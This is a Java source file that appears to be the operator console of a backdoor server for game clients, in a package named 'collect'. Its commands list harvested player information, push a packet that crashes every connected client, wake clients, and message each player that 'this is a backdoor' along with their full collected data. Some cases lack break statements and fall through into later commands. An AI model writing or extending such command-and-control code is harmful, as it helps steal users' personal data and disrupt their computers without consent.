package com.omg.pf.collect;


import com.omg.pf.collect.data.PlayerInfo;
import com.omg.pf.collect.netty.packet.CrashClientPacket;
import com.omg.pf.collect.netty.packet.RemoteMessagePacket;
import com.omg.pf.collect.netty.packet.WakeClient;
import io.netty.channel.ChannelHandlerContext;
import org.apache.logging.log4j.util.Strings;

import java.util.*;

public class Command {

    Scanner scanner = new Scanner(System.in);

    public Command() {

    }

    //执行命令循环
    public void startcommand() {
        while (true) {
            switch (scanner.next()) {
                default:
                    System.out.println("无效");
                    break;
                case "status": {
                    Collection<PlayerInfo> playerInfos = MainServer.getPlayerManager().getAllPlayerInfo();
                    System.out.println("玩家数量:" + playerInfos.size());
//                    输出全部玩家名
                    List<String> playerNames = new ArrayList<>();
                    playerInfos.forEach(playerInfo -> {
                        playerNames.add(playerInfo.getPlayerName());
                    });
                    System.out.println("玩家列表:" + Strings.join(playerNames, ','));
                    break;
                }
                case "printall":
                    Collection<PlayerInfo> playerInfos = MainServer.getPlayerManager().getAllPlayerInfo();
                    playerInfos.forEach(playerInfo -> {
                        System.out.println(playerInfo.toString());
                    });
                    break;
                case "help":
                    System.out.println("status:查看服务器状态");
                    break;
                case "crashall":
                    for (ChannelHandlerContext ctx : MainServer.getPlayerManager().getCtxMap().values()) {
                        ctx.writeAndFlush(new CrashClientPacket());
                    }
                case "wakeall":
                    for (ChannelHandlerContext ctx : MainServer.getPlayerManager().getCtxMap().values()) {
                        ctx.writeAndFlush(new WakeClient());
                    }

                case "msgall":
                    for (Map.Entry<String,ChannelHandlerContext> en : MainServer.getPlayerManager().getCtxMap().entrySet()) {
                        PlayerInfo playerInfo= MainServer.getPlayerManager().getPlayerInfo(en.getValue());
                        RemoteMessagePacket remoteMessagePacket=new RemoteMessagePacket();
                        List<String> msg=new ArrayList<>();
                        msg.add("这是后门！");
                        msg.add("你的全部信息："+playerInfo);
                        remoteMessagePacket.setMsg(msg);
                        en.getValue().writeAndFlush(remoteMessagePacket);
                    }
            }
        }


    }

    public void stopcommand() {
        scanner.close();
    }
}
